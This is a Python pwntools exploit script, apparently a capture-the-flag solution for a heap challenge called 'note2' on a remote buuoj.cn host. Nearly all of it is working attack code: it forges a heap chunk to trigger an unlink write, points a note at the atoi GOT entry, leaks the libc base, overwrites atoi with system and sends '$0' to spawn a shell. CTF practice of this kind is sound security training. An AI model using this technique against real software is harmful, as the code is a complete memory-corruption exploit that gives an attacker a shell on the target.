#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'note2'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28944

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('>>', str(1))
	sla(')', str(size))
	sla(':', data)

def rm(idx):
	sla('>>', str(4))
	sla(':', str(idx))

def md(idx, over, data):
	sla('>>', str(3))
	sla(':', str(idx))
	sla(']', str(over))
	sla(':', data)

def dp(idx):
	sla('>>', str(2))
	sla(':', str(idx))

def q():
	sla(':', str(5))	

def base(name, addr):
	sla('e:', name)
	sla('s:', addr)

#--------------------------Exploit--------------------------
def exploit():
	base('i0gan', 'AAA')
	target = 0x602120
	p = p64(0) + p64(0x71)
	p += p64(target - 0x18) + p64(target - 0x10)
	p += '\x00' * (0x70 - 0x20)
	p += p64(0x70) # for bypass unlink check

	ad(0x80, p)
	ad(0x0, '')
	ad(0x80, 'A' * 0x10)

	rm(1)
	p = 'B'*0x10 + p64(0xa0) + p64(0x90)
	ad(0x0, p)

	rm(2)

	p = '\xAA' * 0x18
	p += p64(exe.got['atoi'])

	md(0, 1, p)

	dp(0)

	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym['atoi']
	li('libc base : ' + hex(lib.address))

	md(0, 1, p64(lib.sym['system']))

	sl('$0')
	

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
